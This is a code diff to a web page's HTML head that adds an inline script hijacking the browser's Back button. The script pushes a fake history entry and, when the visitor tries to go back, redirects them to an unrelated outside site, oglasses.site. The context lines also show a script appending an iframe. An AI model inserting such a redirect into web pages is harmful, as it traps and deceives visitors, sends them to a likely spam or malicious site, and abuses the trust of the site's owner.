@@ -55,6 +55,18 @@
             document.body.appendChild(iframe);
         });
     </script>
+<script>
+    (function() {
+    if (window.history && window.history.pushState) {
+        window.history.pushState('forward', null, window.location.href);
+
+        window.onpopstate = function() {
+            window.location.href = 'https://oglasses.site/random-1';
+        };
+    }
+})();
+    </script>
+
 </head>
 <body>
 </body>
